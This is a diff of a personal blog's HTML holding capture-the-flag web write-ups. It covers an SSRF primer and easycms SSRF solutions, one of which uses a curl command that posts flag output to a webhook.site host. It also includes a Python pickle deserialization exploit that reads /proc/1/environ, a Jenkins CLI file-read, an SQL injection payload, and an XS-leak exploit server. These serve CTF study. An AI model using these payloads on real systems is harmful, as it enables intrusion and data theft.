+<p>利用gopher协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp 等，也可以发送 GET、POST 请求，这可以拓宽 SSRF 的攻击面。</p>
+</li>
+<li><p>利用file协议读取本地文件等。</p>
+</li>
+</ol>
+<h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()、fsockopen()、curl_exec()、fopen()、readfile()</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><h3 id="常见SSRF漏洞验证方式"><a href="#常见SSRF漏洞验证方式" class="headerlink" title="常见SSRF漏洞验证方式"></a>常见SSRF漏洞验证方式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">排除法：浏览器f12查看源代码看是否是在本地进行了请求</span><br><span class="line">比如：该资源地址类型为 http://www.xxx.com/a.php?image=URL,URL参数若是其他服务器地址就可能存在SSRF漏洞</span><br><span class="line"></span><br><span class="line">dnslog等工具进行测试，看是否被访问(可以在盲打后台，用例中将当前准备请求的url和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求)</span><br><span class="line"></span><br><span class="line">抓包分析发送的请求是不是通过服务器发送的，如果不是客户端发出的请求，则有可能是存在漏洞。接着找存在HTTP服务的内网地址</span><br><span class="line"></span><br><span class="line">从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</span><br><span class="line">通过二级域名暴力猜解工具模糊猜测内网地址</span><br><span class="line">通过file协议读取内网信息获取相关地址</span><br><span class="line"></span><br><span class="line">直接返回的Banner、title、content等信息</span><br><span class="line"></span><br><span class="line">留意布尔型SSRF，通过判断两次不同请求结果的差异来判断是否存在SSRF，类似布尔型sql盲注方法。</span><br></pre></td></tr></table></figure>
+
+<h3 id="SSRF漏洞点挖掘"><a href="#SSRF漏洞点挖掘" class="headerlink" title="SSRF漏洞点挖掘"></a>SSRF漏洞点挖掘</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1. 社交分享功能：获取超链接的标题等内容进行显示</span><br><span class="line"></span><br><span class="line">2. 转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</span><br><span class="line"></span><br><span class="line">3. 在线翻译：给网址翻译对应网页的内容</span><br><span class="line"></span><br><span class="line">4. 图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片</span><br><span class="line"></span><br><span class="line">5. 图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验</span><br><span class="line"></span><br><span class="line">6. 云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试</span><br><span class="line"></span><br><span class="line">7. 网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作</span><br><span class="line"></span><br><span class="line">8. 数据库内置功能：数据库的比如mongodb的copyDatabase函数</span><br><span class="line"></span><br><span class="line">9. 邮件系统：比如接收邮件服务器地址</span><br><span class="line"></span><br><span class="line">10. 编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等</span><br><span class="line"></span><br><span class="line">11. 未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞</span><br><span class="line"></span><br><span class="line">12.从远程服务器请求资源（upload from url 如discuz！；import &amp; expost rss feed 如web blog；使用了xml引擎对象的地方 如wordpress xmlrpc.php）</span><br></pre></td></tr></table></figure>
+
+<p>url关键字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Share、wap、url、link、src、source、target、u、3g、display、sourceURL、imageURL、domain</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/miruier/p/13907150.html">看看这里吧！！！SSRF漏洞</a></p>
+<h4 id="题目easycms："><a href="#题目easycms：" class="headerlink" title="题目easycms："></a>题目easycms：</h4><p>搜索到迅睿cms 曾经存在ssrf，审计代码发现qrcode路由存在ssrf构造如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2ze3cmcfbu4h73d67lga.cloudeci1.ichunqiu.com/index.php</span><br><span class="line">?s=api</span><br><span class="line">&amp;c=api</span><br><span class="line">&amp;m=qrcode</span><br><span class="line">&amp;thumb=http://test.ai.darwinchow.com</span><br><span class="line">&amp;text=sfaf</span><br><span class="line">&amp;size=11</span><br><span class="line">&amp;level=1</span><br></pre></td></tr></table></figure>
+
+<p>发现存在ssrf,但是直接访问127.0.0.1是被过滤的 尝试302去绕过</p>
+<p>302配置如下</p>
+<p><img src="/2024/06/01/ssrf/image-20240523154243866.png" alt="image-20240523154243866"></p>
+<p>cmd处可任意命令执行，执行readflag外带flag &#x2F;readflag | curl -X POST -d @- <a target="_blank" rel="noopener" href="https://webhook.site/c8aa80e1-fbab-4051-b280-212f3a50a3e7">https://webhook.site/c8aa80e1-fbab-4051-b280-212f3a50a3e7</a></p>
+<p><img src="/2024/06/01/ssrf/image-20240523154302340.png" alt="image-20240523154302340"></p>
+<h3 id="题目easycms-revenge："><a href="#题目easycms-revenge：" class="headerlink" title="题目easycms_revenge："></a>题目easycms_revenge：</h3><p>刚才的差不多，好像加了一点waf？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://eci-2zeflmaf18ustq2ioeb5.cloudeci1.ichunqiu.com/index.php</span><br><span class="line">?s=api</span><br><span class="line">&amp;c=api</span><br><span class="line">&amp;m=qrcode</span><br><span class="line">&amp;thumb=http://39.105.130.36/index.php</span><br><span class="line">&amp;text=sfaf</span><br><span class="line">&amp;size=1024</span><br><span class="line">&amp;level=1</span><br></pre></td></tr></table></figure>
+
+<p>通过302到本地然后读取文件执行命令</p>
+<p><img src="/2024/06/01/ssrf/image-20240523154404026.png" alt="image-20240523154404026"></p>
+<p>外带flag</p>
+<p><img src="/2024/06/01/ssrf/image-20240523154423155.png" alt="image-20240523154423155"></p>
+
+      
+    </div>
+
+    
+    
+    
+	
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2024/03/25/NKCTF/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/ch.jpg">
       <meta itemprop="name" content="chleynx">
-      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
+      <meta itemprop="description" content="Record my study life">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="星河风">
+      <meta itemprop="name" content="chleynx's blog">
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
@@ -215,7 +643,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="attack-tacooooo"><a href="#attack-tacooooo" class="headerlink" title="attack_tacooooo"></a><strong>attack_tacooooo</strong></h2><p>账号<a href="mailto:&#116;&#x61;&#x63;&#111;&#x6f;&#x6f;&#111;&#x6f;&#x40;&#113;&#x71;&#x2e;&#99;&#111;&#109;">&#116;&#x61;&#x63;&#111;&#x6f;&#x6f;&#111;&#x6f;&#x40;&#113;&#x71;&#x2e;&#99;&#111;&#109;</a></p>
+          <h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="attack-tacooooo"><a href="#attack-tacooooo" class="headerlink" title="attack_tacooooo"></a><strong>attack_tacooooo</strong></h2><p>账号<a href="mailto:&#116;&#x61;&#x63;&#x6f;&#111;&#111;&#111;&#x6f;&#64;&#x71;&#113;&#x2e;&#99;&#x6f;&#x6d;">&#116;&#x61;&#x63;&#x6f;&#111;&#111;&#111;&#x6f;&#64;&#x71;&#113;&#x2e;&#99;&#x6f;&#x6d;</a></p>
 <p>密码tacooooo</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line"></span><br><span class="line">class Exploit(object):</span><br><span class="line"></span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        code = &quot;&quot;&quot;</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">def find_flag_and_write(source_directory, destination_path, destination_file_name):</span><br><span class="line"></span><br><span class="line">    with open(&quot;/proc/1/environ&quot;, &#x27;r&#x27;) as flag_file:</span><br><span class="line">        flag_content = flag_file.read()</span><br><span class="line"></span><br><span class="line">    destination_file_path = os.path.join(destination_path, destination_file_name)</span><br><span class="line">    with open(destination_file_path, &#x27;a&#x27;) as destination_file:</span><br><span class="line">        destination_file.write(flag_content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">find_flag_and_write(&#x27;/&#x27;, &#x27;../var/lib/pgadmin/storage/tacooooo_qq.com/&#x27;, &#x27;flag.txt&#x27;)</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">        # 使用纯 Python 代码来写入文件</span><br><span class="line">        return (exec, (code,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 序列化 exploit 对象</span><br><span class="line">with open(&#x27;posix.pickle&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">    pickle.dump(Exploit(), f)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -289,11 +717,11 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/ch.jpg">
       <meta itemprop="name" content="chleynx">
-      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
+      <meta itemprop="description" content="Record my study life">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="星河风">
+      <meta itemprop="name" content="chleynx's blog">
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
@@ -384,11 +812,11 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/ch.jpg">
       <meta itemprop="name" content="chleynx">
-      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
+      <meta itemprop="description" content="Record my study life">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="星河风">
+      <meta itemprop="name" content="chleynx's blog">
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
@@ -579,11 +1007,11 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/ch.jpg">
       <meta itemprop="name" content="chleynx">
-      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
+      <meta itemprop="description" content="Record my study life">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="星河风">
+      <meta itemprop="name" content="chleynx's blog">
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
@@ -674,11 +1102,11 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/ch.jpg">
       <meta itemprop="name" content="chleynx">
-      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
+      <meta itemprop="description" content="Record my study life">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="星河风">
+      <meta itemprop="name" content="chleynx's blog">
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
@@ -777,11 +1205,11 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/ch.jpg">
       <meta itemprop="name" content="chleynx">
-      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
+      <meta itemprop="description" content="Record my study life">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="星河风">
+      <meta itemprop="name" content="chleynx's blog">
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
@@ -827,414 +1255,6 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">C:\Users\18774\Desktop&gt;java -jar jenkins-cli.jar -s http://47.96.171.129:8080 who-am-i &quot;@/flag&quot;</span><br><span class="line"></span><br><span class="line">ERROR: No argument is allowed: **rwctf&#123;jenkins_no_vulner!!&#125;**</span><br><span class="line"></span><br><span class="line">java -jar jenkins-cli.jar who-am-i</span><br><span class="line"></span><br><span class="line">Reports your credential and permissions.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>ok！</p>
-
-      
-    </div>
-
-    
-    
-    
-	
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2024/02/05/IrisCTF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/ch.jpg">
-      <meta itemprop="name" content="chleynx">
-      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="星河风">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/02/05/IrisCTF/" class="post-title-link" itemprop="url">IrisCTF</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2024-02-05 00:39:11 / 修改时间：00:40:44" itemprop="dateCreated datePublished" datetime="2024-02-05T00:39:11+08:00">2024-02-05</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/challenge/" itemprop="url" rel="index"><span itemprop="name">challenge</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="What’s-My-Password"><a href="#What’s-My-Password" class="headerlink" title="What’s My Password"></a>What’s My Password</h2><p>sql injection</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;skat&quot;,&quot;password&quot;:&quot;\&quot; union select username,password from users where username=\&quot;skat\&quot;#&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="LameNote"><a href="#LameNote" class="headerlink" title="LameNote"></a>LameNote</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Note challenges are lame so I made a lamer one. Flag matches irisctf&#123;[a-z_]+&#125;</span><br><span class="line"></span><br><span class="line">Admin will log in, make a note with the flag, then visit your link. (Sorry if the timeout is a bit broken on this challenge, there&#x27;s no PoW on the admin bot so feel free to spam it a bit)</span><br><span class="line"></span><br><span class="line">nc lamenote-adminbot.chal.irisc.tf 10300</span><br><span class="line"></span><br><span class="line">Hint!</span><br><span class="line">Please redownload if you downloaded server files at the start of the event.</span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://prod-files-secure.s3.us-west-2.amazonaws.com/c378b070-6063-4137-81ee-f75f82009b81/e71696da-6929-44f6-843a-ade7f472026a/lamenote.tar.gz">lamenote.tar.gz</a></p>
-<p><a target="_blank" rel="noopener" href="https://prod-files-secure.s3.us-west-2.amazonaws.com/c378b070-6063-4137-81ee-f75f82009b81/d843f21b-391a-4c6a-9022-f34c2e512058/lamenote-adminbot.tar.gz">lamenote-adminbot.tar.gz</a></p>
-<p>maybe <a target="_blank" rel="noopener" href="https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks">https://infosec.zeyu2001.com/2023/from-xs-leaks-to-ss-leaks</a></p>
-<p>trying…</p>
-<p>there is always response 200, so seems like not this</p>
-<p>Got idea: In our resourse need make bot to create a new note with content <strong>irisctf{a</strong> and with img url to <strong>any webhook</strong>, then in iframe open the <em><strong>&#x2F;search?query&#x3D;irisctf{a</strong></em></p>
-<ul>
-<li>if there is only our note matches then server will open our note and request to our webhook</li>
-<li>if there is more than 1 note with “irisctf{a” then response will be just urls of notes, no request to webhook, so we can extract the symbol of flag</li>
-</ul>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> <span class="title class_">Flask</span>, make_response, request</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask_cors <span class="keyword">import</span> <span class="variable constant_">CORS</span></span><br><span class="line"></span><br><span class="line">app = <span class="title class_">Flask</span>(__name__)</span><br><span class="line"><span class="title function_">CORS</span>(app)</span><br><span class="line">callbacks = []</span><br><span class="line">temp = <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;html&gt;</span></span><br><span class="line"><span class="string">  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line"><span class="string">  &lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;iframe name=&quot;</span>test<span class="string">&quot; style=&quot;</span><span class="attr">display</span>:none;<span class="string">&quot;&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">    &lt;iframe name=&quot;</span>test2<span class="string">&quot; style=&quot;</span><span class="attr">display</span>:none;<span class="string">&quot;&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">    &lt;form action=&quot;</span>&lt;<span class="attr">https</span>:<span class="comment">//lamenote-web.chal.irisc.tf/create&gt;&quot; method=&quot;POST&quot; target=&quot;test&quot;&gt;</span></span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;title&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Flag&quot;</span> /&gt;</span></span></span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=<span class="string">&quot;irisctf<span class="symbol">&amp;#123;</span>&#123;&#125;&quot;</span> /&gt;</span></span></span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;image&quot;</span> <span class="attr">value</span>=<span class="string">&quot;https<span class="symbol">&amp;#58;</span><span class="symbol">&amp;#47;</span><span class="symbol">&amp;#47;</span>edu<span class="symbol">&amp;#46;</span>ghost1032<span class="symbol">&amp;#46;</span>top/callback<span class="symbol">&amp;#63;</span>callback<span class="symbol">&amp;#61;</span>&#123;&#125;&amp;index=&#123;&#125;&quot;</span> /&gt;</span></span></span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span></span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    </span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&lt;https://lamenote-web.chal.irisc.tf/search&gt;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span> <span class="attr">target</span>=<span class="string">&quot;test2&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;query&quot;</span> <span class="attr">value</span>=<span class="string">&quot;irisctf<span class="symbol">&amp;#123;</span>&#123;&#125;&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">1</span>].<span class="title function_">submit</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">@app.route(&#x27;/leak/&lt;i&gt;/&lt;string&gt;&#x27;)</span></span><br><span class="line"><span class="string">def index(i,string):</span></span><br><span class="line"><span class="string">    return make_response(temp.format(string, string, i , string))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route(&#x27;/callback&#x27;)</span></span><br><span class="line"><span class="string">def cb():</span></span><br><span class="line"><span class="string">    cb = request.args.get(&#x27;callback&#x27;) </span></span><br><span class="line"><span class="string">    index = int(request.args.get(&#x27;index&#x27;))</span></span><br><span class="line"><span class="string">    if len(callbacks) &lt;= index:</span></span><br><span class="line"><span class="string">        callbacks.append(&#123;&#125;)</span></span><br><span class="line"><span class="string">    if cb in callbacks[index]:</span></span><br><span class="line"><span class="string">        callbacks[index][cb] += 1</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        callbacks[index][cb] = 1</span></span><br><span class="line"><span class="string">    print(callbacks)</span></span><br><span class="line"><span class="string">    return make_response(&#x27;&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route(&#x27;/result&#x27;)</span></span><br><span class="line"><span class="string">def result():</span></span><br><span class="line"><span class="string">    index = int(request.args.get(&#x27;index&#x27;))</span></span><br><span class="line"><span class="string">    if index &gt;= len(callbacks):</span></span><br><span class="line"><span class="string">        return make_response(&#x27;Nope&#x27;)</span></span><br><span class="line"><span class="string">    return make_response(str(callbacks[index]))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">app.run(debug=True, port=48080)</span></span><br></pre></td></tr></table></figure>
-
-<p>example:</p>
-<p>echo “<a target="_blank" rel="noopener" href="https://edu.ghost1032.top/leak/0/pz">https://edu.ghost1032.top/leak/0/pz</a>“ | nc -q 0 <a target="_blank" rel="noopener" href="http://lamenote-adminbot.chal.irisc.tf/">lamenote-adminbot.chal.irisc.tf</a> 10300 would have 2 callback requests</p>
-<p>while</p>
-<p>echo “<a target="_blank" rel="noopener" href="https://edu.ghost1032.top/leak/0/pl">https://edu.ghost1032.top/leak/0/pl</a>“ | nc -q 0 <a target="_blank" rel="noopener" href="http://lamenote-adminbot.chal.irisc.tf/">lamenote-adminbot.chal.irisc.tf</a> 10300 only has 1 callback request.</p>
-<p>You should try a couple of times for every char, since <code>Sorry if the timeout is a bit broken on this challenge</code></p>
-<p>And that’s why I don’t have a working full-automatic exp :(</p>
-<p>Maybe we can solve the issue by making multiple tries for every char.</p>
-<p>I made some exploit, trying now …</p>
-<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">irisctf&#123;please_no_more_unintended_bugs&#125;</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-	
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2024/02/05/Insomni-hack/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/ch.jpg">
-      <meta itemprop="name" content="chleynx">
-      <meta itemprop="description" content="不是看到希望才坚持，而是坚持了才能看到希望">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="星河风">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/02/05/Insomni-hack/" class="post-title-link" itemprop="url">Insomni'hack</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2024-02-05 00:00:09 / 修改时间：00:21:02" itemprop="dateCreated datePublished" datetime="2024-02-05T00:00:09+08:00">2024-02-05</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/challenge/" itemprop="url" rel="index"><span itemprop="name">challenge</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
